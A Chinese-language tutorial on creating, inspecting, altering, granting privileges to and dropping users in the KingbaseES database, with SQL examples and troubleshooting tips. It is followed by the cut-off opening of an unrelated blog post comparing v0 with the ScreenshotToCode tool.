<p>创建用户属于权限管理的起始部分，要给出用户名，密码以及一些基本属性，比如默认数据库，密码有效期限等，接下来会阐述 <code>CREATE USER</code> 的关键语法，并且依照安全方面的良好做法来给出例子</p>
<h4 data-id="heading-6">3.1 1. 基础语法</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> 用户名 <span class="hljs-keyword">WITH</span> PASSWORD <span class="hljs-string">'密码'</span> [选项];
</code></pre>
<p>下面这些“选项”的解释（适合初学者了解）：</p>
<ul>
<li><code>PASSWORD '密码'</code>：用户登录密码（建议包含大小写、数字、特殊字符，避免弱密码）；</li>
<li><code>DEFAULT DATABASE 数据库名</code>指的是用户登录时默认关联的数据库，比如<code>kingbase</code>。</li>
<li><code>DEFAULT SCHEMA</code> 是指用户默认会用的模式，比如 <code>test_schema</code>。</li>
<li><code>CREATEDB</code>：允许用户创建数据库（前文提到的建库权限，仅管理员可授予）；</li>
<li><code>INHERIT</code>：用户自动继承所属角色的权限（默认开启，无需手动指定）。</li>
</ul>
<h4 data-id="heading-7">3.2 2. 实操示例：创建普通用户</h4>
<h5 data-id="heading-8">示例 ：创建基础用户 <code>test</code>（仅用于访问数据，无建库权限）</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> test <span class="hljs-keyword">WITH</span> PASSWORD <span class="hljs-string">'123456'</span> 
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20623ef5ce9d4103b13ad33699419bf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=iBh0hJdwlL05%2BFS7na2h8VWFxfI%3D" alt="1d089813-04bf-4aa4-8797-87254fe37d7b.png" loading="lazy"/></p>
<ul>
<li><strong>成功验证</strong>：执行后提示 <code>CREATE ROLE</code>（KingbaseES 中 “用户” 本质是特殊角色，故返回 <code>CREATE ROLE</code>），表示用户创建成功。</li>
</ul>
<h4 data-id="heading-9">3.3 3. 注意事项（安全必看）</h4>
<ol>
<li><strong>密码复杂度</strong>：生产环境需设置强密码（如至少 8 位，含大小写、数字、特殊字符），避免 <code>123456</code> 等弱密码；</li>
<li><strong>避免重复创建</strong>：若用户名已存在，执行 <code>CREATE USER</code> 会报错 “role already exists”，需先删除旧用户或改用 <code>ALTER USER</code> 修改。</li>
</ol>
<h3 data-id="heading-10">四、查看用户：了解用户权限与属性</h3>
<p>创建好用户之后，要利用 ksql 命令来查看用户的详细信息，包含权限，默认属性以及所属角色等方面的内容，建议采用 <code>\du</code> 这一系列的命令，这属于一种最为直观的查看用户信息的方式。</p>
<h4 data-id="heading-11">4.1 1. 查看所有用户（\du 命令）</h4>
<p>执行 <code>\du</code> 可列出当前数据库中所有用户的核心信息，快速了解用户列表：</p>
<pre><code class="hljs language-sql" lang="sql">\du
</code></pre>
<p><strong>执行结果示例（关键信息筛选）：</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98b1b9623e784662aa371c829d67a830~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=qJ4ix%2BELeEV3bW7iBdepoW5ubAo%3D" alt="d99feed7-5403-4144-ad91-e3887eb57c5f.png" loading="lazy"/></p>
<h4 data-id="heading-12">4.2 2. 查看单个用户详情（\du 用户名）</h4>
<p>若需查看某一用户的详细权限（如 <code>test</code>），执行 <code>\du 用户名</code>：</p>
<pre><code class="hljs language-sql" lang="sql">\du test
</code></pre>
<p><strong>执行结果示例：</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a1eaec5b4754fb5927c7e959887c90d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=dr5kz63hQQQ1KU9QgSdd5WyR8ZA%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-13">4.3 3. 查看用户的权限明细（\dp 命令）</h4>
<p>若需更精细地查看用户对某类对象（如表、模式）的权限，可使用 <code>\dp</code> 命令：</p>
<ul>
<li>
<p>查看表权限：<code>\dp 表名</code>（如查看 <code>sys_user</code> 表的权限）；</p>
<pre><code class="hljs language-sql" lang="sql">\dp test_schema.sys_user
</code></pre>
</li>
</ul>
<h3 data-id="heading-14">五、修改用户：适配用户属性变更</h3>
<p>业务需求发生改变的时候，要对用户属性做一些调整，比如重置密码或者增减创建数据库的权限，<code>ALTER USER</code> 这个核心语法包含一些常见的操作</p>
<h4 data-id="heading-15">5.1 1. 修改用户密码（最常用操作）</h4>
<p>当用户忘了密码或者是到了规定的时间得要换密码时，管理员可以运行如下命令（拿 <code>test</code> 来举例）：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：ALTER USER 用户名 WITH PASSWORD '新密码';</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> test <span class="hljs-keyword">WITH</span> PASSWORD <span class="hljs-string">'User1@New2024'</span>;
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a912238787be439c8d4b56e06026a966~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=JIy4S8e7KqMFIurluN6mQz7tGRA%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>验证</strong>：修改之后，用户就能重新登录（用 <code>ksql -d kingbase -U user1</code> 命令），然后输入新的密码来验证是否有效</li>
</ul>
<h4 data-id="heading-16">5.2 2. 授予用户属性（如建库权限）</h4>
<p>如果想要给 <code>test</code> 授予创建数据库的权限（之前没有这个权限）</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：ALTER USER 用户名 权限属性;</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> test CREATEDB;
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78bb43ef3cf64e19818cbffc20744743~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=VqnC0NTtKHR4%2Bn%2BoYOv5IXxFAIU%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>验证</strong>：执行 <code>\du test</code> 这条命令，在 <code>Attributes</code> 栏里能看到 <code>创建 DB</code> 这个选项，这就表明权限已经被添加了</li>
</ul>
<h4 data-id="heading-17">5.3 3. 撤销用户属性（如收回建库权限）</h4>
<p>若 <code>test</code> 不再需要建库权限，可收回：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：ALTER USER 用户名 NO 权限属性;</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> test NOCREATEDB;
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/393b8a3b4db7415192f887fc73b403ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=Y1gYLPAxePK8w0wp6zu57TOHNmE%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>验证</strong>：执行 <code>\du test</code>，<code>Attributes</code> 中的 <code>Create DB</code> 会消失。</li>
</ul>
<h4 data-id="heading-18">5.4 4. 修改用户默认属性（如默认数据库）</h4>
<p>将 <code>user1</code> 的默认数据库从 <code>kingbase</code> 改为 <code>test</code>（需确保 <code>test_db</code> 已存在）：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> test <span class="hljs-keyword">SET</span> <span class="hljs-keyword">DEFAULT</span> DATABASE test;
</code></pre>
<ul>
<li><strong>验证</strong>：等用户 <code>test</code> 下次登录的时候，只要用 <code>ksql -U user1</code> 这个命令，系统就会自动帮它连接到 <code>test</code> 这个数据库，不需要手动加上 <code>-d test</code> 这样的参数。</li>
</ul>
<h3 data-id="heading-19">六、权限控制：授予与回收（核心环节）</h3>
<p>权限控制处于用户运作的核心地位，要依照“数据库→模式→表”这样的层级来执行权限的赋予或者收回，从而保证用户只能对自身业务范畴之内的对象实施操作，有关<code>GRANT</code>（即赋予）和 <code>REVOKE</code>（即收回）的语法，下面将针对不同情形展开详细阐述</p>
<h4 data-id="heading-20">6.1 1. 授予权限（GRANT 命令）</h4>
<h5 data-id="heading-21">场景 1：授予数据库连接权限（用户需先能连接库，才能操作内部对象）</h5>
<p>向<code>test</code>赋予连接<code>kingbase</code>数据库的权限</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：GRANT 权限类型 ON DATABASE 数据库名 TO 用户名;</span>
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">CONNECT</span> <span class="hljs-keyword">ON</span> DATABASE kingbase <span class="hljs-keyword">TO</span> test;
</code></pre>
<ul>
<li><strong>作用</strong>：如果没有这项权限，那么<code>test</code>就无法与<code>kingbase</code>数据库建立联系，系统将会显示错误信息“permission denied to connect to database kingbase”。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8803e7cf1d654f63916b19a99e09d042~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=iNrRPAyPxinjO7hTAgC%2FJ1jLavc%3D" alt="image.png" loading="lazy"/></li>
</ul>
<h5 data-id="heading-22">场景 2：授予模式访问权限（用户需能访问模式，才能操作模式下的表）</h5>
<p>给 <code>test</code> 授予访问 <code>test_schema</code> 模式的权限：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：GRANT 权限类型 ON SCHEMA 模式名 TO 用户名;</span>
<span class="hljs-keyword">GRANT</span> USAGE <span class="hljs-keyword">ON</span> SCHEMA test_schema <span class="hljs-keyword">TO</span> test;
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd7da5f9084d427e84e643e8b3374624~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=rrn4kAvzzq5U4KEJ8JP9bXbI1S8%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>作用</strong>：<code>USAGE</code> 权限是访问模式的基础，无此权限，<code>test</code> 无法查看 <code>test_schema</code> 下的表。</li>
</ul>
<h5 data-id="heading-23">场景 3：授予表操作权限（用户业务核心权限，如查询、插入）</h5>
<p>给 <code>test</code> 授予 <code>test_schema.sys_user</code> 表的 <code>SELECT</code>（查询）和 <code>INSERT</code>（插入）权限：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：GRANT 权限类型 ON 表名 TO 用户名;</span>
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>, <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> test_schema.sys_user <span class="hljs-keyword">TO</span> test;
</code></pre>
<ul>
<li>
<p><strong>进阶</strong>：授予所有权限（谨慎！生产环境不推荐）：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> test_schema.sys_user <span class="hljs-keyword">TO</span> test;
</code></pre>
</li>
<li>
<p><strong>验证</strong>：执行 <code>\dp test_schema.sys_user</code>，可看到 <code>test</code> 拥有的权限。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/568a049d0dae4c909bc6cd97eff41aea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=%2Ft5SILcEuvc%2B%2FysUBa5vqCevmG8%3D" alt="image.png" loading="lazy"/></p>
</li>
</ul>
<h4 data-id="heading-24">6.2 2. 回收权限（REVOKE 命令）</h4>
<p>当用户不再需要某类权限时（如 <code>test</code> 无需插入数据），需及时回收，避免数据风险：</p>
<h5 data-id="heading-25">场景：回收 <code>test</code> 对 <code>sys_user</code> 表的 <code>INSERT</code> 权限</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：REVOKE 权限类型 ON 表名 FROM 用户名;</span>
<span class="hljs-keyword">REVOKE</span> <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> test_schema.sys_user <span class="hljs-keyword">FROM</span> test;
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1b83b6763004a72adbb03d07b977433~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487370&amp;x-signature=APnUDUDD3WCOs79YMQwowgoJXDM%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>验证</strong>：执行 <code>\dp test_schema.sys_user</code>，<code>test</code> 的权限会只剩 <code>SELECT</code>；</li>
<li><strong>注意</strong>：回收权限需管理员执行，且只能回收之前授予的权限（无法回收用户默认拥有的权限）。</li>
</ul>
<h3 data-id="heading-26">七、删除用户：高危操作，谨慎执行</h3>
<p>用户被移除时，其本人及其相关权限将会被彻底移除，但是所创建的对象（诸如表，视图等）不会遭到删除，而在执行此类操作之前，一定要确保该用户与核心业务没有联系，其具体的执行步骤包含如下几点：</p>
<h4 data-id="heading-27">7.1 1. 基础语法（加 IF EXISTS 避免报错）</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">USER</span> IF <span class="hljs-keyword">EXISTS</span> 用户名;
</code></pre>
<ul>
<li><code>IF EXISTS</code>：若用户不存在，仅提示警告（<code>NOTICE: role "用户名" does not exist, skipping</code>），不报错，避免中断后续操作。</li>
</ul>
<h4 data-id="heading-28">7.2 2. 特殊场景：用户有创建的对象（需 CASCADE）</h4>
<p>用户 <code>test</code> 已创建表，比如 <code>test_schema.user2_table</code>，如果直接删除，会出现错误提示：“role 'test' 无法被删除，因为存在对象依賴于此角色”，此时应当加上 <code>CASCADE</code> 参数执行级联删除以解决依赖问题（不过这只会删除与该用户相关的权限，并不会删除由该用户创建的各类对象）。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：DROP USER IF EXISTS 用户名 CASCADE;</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">USER</span> IF <span class="hljs-keyword">EXISTS</span> test CASCADE;
</code></pre>
<ul>
<li><strong>高危提醒</strong>：CASCADE 用来处理“用户存在依赖对象”的删除情况，并不会删除由用户创建的表/视图，用户得自行执行 DROP 操作来删除自身创建的对象（例如：DROP TABLE test_schema.user2_table;）。</li>
</ul>
<h4 data-id="heading-29">7.3 3. 删除前的确认步骤（必做）</h4>
<ol>
<li>确认用户无活跃会话：执行 <code>SELECT pid, usename FROM pg_stat_activity WHERE usename = 'user1';</code>，若有结果，先终止会话（<code>SELECT pg_terminate_backend(pid);</code>）；</li>
<li>确认用户无核心权限：执行 <code>\du user1</code>，确认用户无 <code>Superuser</code> 等关键权限；</li>
<li>确认用户无业务对象：执行 <code>SELECT tablename FROM pg_tables WHERE tableowner = 'user1';</code>，确认用户无创建的表。</li>
</ol>
<h3 data-id="heading-30">八、常见问题排查：新手常踩的权限坑</h3>
<h4 data-id="heading-31">问题 1：用户登录报错 “连接数据库的权限被拒绝”</h4>
<p><strong>报错信息</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">ERROR:  permission denied to connect to database "kingbase"
</code></pre>
<p><strong>原因</strong>：用户无该数据库的 <code>CONNECT</code> 权限（如 <code>user1</code> 未被授予连接 <code>kingbase</code> 的权限）。<br/>
<strong>解决方案</strong>：管理员授予 <code>CONNECT</code> 权限：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">CONNECT</span> <span class="hljs-keyword">ON</span> DATABASE kingbase <span class="hljs-keyword">TO</span> user1;
</code></pre>
<h4 data-id="heading-32">问题 2：用户查询表报错 “对模式的权限被拒绝”</h4>
<p><strong>报错信息</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">ERROR:  permission denied for schema test_schema
</code></pre>
<p><strong>原因</strong>：用户无该模式的 <code>USAGE</code> 权限，无法访问模式下的表。<br/>
<strong>解决方案</strong>：授予模式访问权限：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">GRANT</span> USAGE <span class="hljs-keyword">ON</span> SCHEMA test_schema <span class="hljs-keyword">TO</span> user1;
</code></pre>
<h4 data-id="heading-33">问题 3：删除用户报错 “存在依赖它的对象”</h4>
<p><strong>报错信息</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">ERROR:  role "user1" cannot be dropped because some objects depend on it
</code></pre>
<p><strong>原因</strong>：用户有创建的对象（如表、视图）或被授予了其他对象的权限。<br/>
<strong>解决方案</strong>：加 <code>CASCADE</code> 级联删除依赖：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">USER</span> IF <span class="hljs-keyword">EXISTS</span> user1 CASCADE;
</code></pre>
<ul>
<li>后续需手动删除用户创建的对象（如 <code>DROP TABLE test_schema.user1_table;</code>）。</li>
</ul>
<h3 data-id="heading-34">九、总结：用户权限管理的核心原则</h3>
<p>本文完整覆盖了用户 “创建→查看→修改→权限→删除” 的全流程，核心原则可总结为：</p>
<ol>
<li>
<p><strong>最小权限原则</strong>：只赋予用户必要权限，比如普通用户只需表的 <code>SELECT</code> 权限，不必授予 <code>DROP</code> 权限。</p>
</li>
<li>
<p><strong>权限层级清晰</strong>：按照“数据库→模式→表”的顺序逐层授予权限，不能越级授权（即如果没有模式权限，却直接赋予表权限）。</p>
</li>
<li>
<p><strong>定期审计</strong>：定期执行审计操作，利用<code>\du</code>和<code>\dp</code>命令定时检查用户权限，并及时收回多余权限，防止出现权限泄露情况</p>
</li>
<li>
<p><strong>高危操作谨慎</strong>：删除用户前需确认会话、对象、权限，避免误删导致业务中断</p>
</li>
</ol>
<p>掌握了用户与权限运作之后，你就具有了 KingbaseES 数据库安全控制的能力，下一篇文章我们会学习“事务运作”，从而保证多操作情况下数据的一致性（就像转账业务里的“扣款”和“入账”必须一起完成或者一起不完成一样）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[虽然 V0 很强大，但是ScreenshotToCode 依旧有市场]]></title>    <link>https://juejin.cn/post/7592823500416761882</link>    <guid>https://juejin.cn/post/7592823500416761882</guid>    <pubDate>2026-01-08T14:30:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592823500416761882" data-draft-id="7592863358258151478" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="虽然 V0 很强大，但是ScreenshotToCode 依旧有市场"/> <meta itemprop="keywords" content="AIGC,人工智能"/> <meta itemprop="datePublished" content="2026-01-08T14:30:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三金得鑫"/> <meta itemprop="url" content="https://juejin.cn/user/4406498335130216"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            虽然 V0 很强大，但是ScreenshotToCode 依旧有市场
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4406498335130216/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三金得鑫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T14:30:29.000Z" title="Thu Jan 08 2026 14:30:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>这篇文章，我想了很久，还是决定写一下。 screen-to-code 对于开发者来说可能有些鸡肋，但是对于一些非技术人员来说，够用且轻量，配置合适的 AI 之后网页的还原度也高。</p>
</blockquote>
<h3 data-id="heading-0">生成网页的方式</h3>
<p>相信大家对 Vercel 家的 v0 都有所耳闻，不少小伙伴们还都下场使用过，它被定义为“人人皆可用的应用构建器”。通过自然语言的方式使其生成 React + Tailwind CSS 代码，具有实时预览和迭代功能。</p>
<p>但它并非没有缺陷：</p>
<ul>
<li><strong>网络问题</strong>。由于 Vercel 本身是国外网站，所以作为他们家的 v0，也是如此。国内访问比较不稳定。</li>
<li><strong>强绑定 React 生态</strong>。想使用其他技术栈需要通过 prompt 的方式，具有一定的局限性。</li>
<li>对于非技术人员来说，由于其生成的代码遵守 React 组件化的设定，反倒增加了学习曲线。</li>
<li><strong>无法完全私有化</strong>。</li>
</ul>
<p>要解决以上问题，其实有几种方式：</p>
<ul>
<li><strong>使用 AI CLI + 代理的方式</strong>。比如使用 Claude Code、Codex 或者 Gemini CLI；</li>
<li><strong>使用 Web 应用</strong>，比如 GLM-4.5-Flash；</li>
<li>使用开源工具 <strong>ScreenToCode</strong>。</li>
</ul>
<h3 data-id="heading-1">以非技术人员的视角看</h3>
<p><strong>第一种方式是目前深受开发者所喜欢的</strong>，尤其是在搭配 Skills 之后，对于生成页面这种事情更是如虎添翼、信手拈来。</p>
<p>但是相对应的，这种方式也存在一定的局限性：</p>
<ul>
<li>对于非开发人员来说，这个方式存在一定的学习成本。</li>
<li>终端方式并不适合每个人，比如设计师和产品经理，他们可能更倾向于可视化的工具。</li>
</ul>
<p>其中<strong>第二种方式最简单</strong>，因为：</p>
<ol>
<li>你只需要访问他们的网址；</li>
<li>上传图片或者复制粘贴要制作的网页地址；</li>
<li>告诉 AI 你想做一个一模一样的网页</li>
</ol>
<p>回车之后它就会为你快速输出一个网页代码出来。比如我上传了一张博客的图片，并让其生成对应的代码：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c14c6045294437a82a404503546a5a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=hprNmURtI6fCdbyCxv4f%2FbkyJsw%3D" alt="" loading="lazy"/></p>
<p>然后它开始解析图片并逐步输出代码到对话框中：</p>
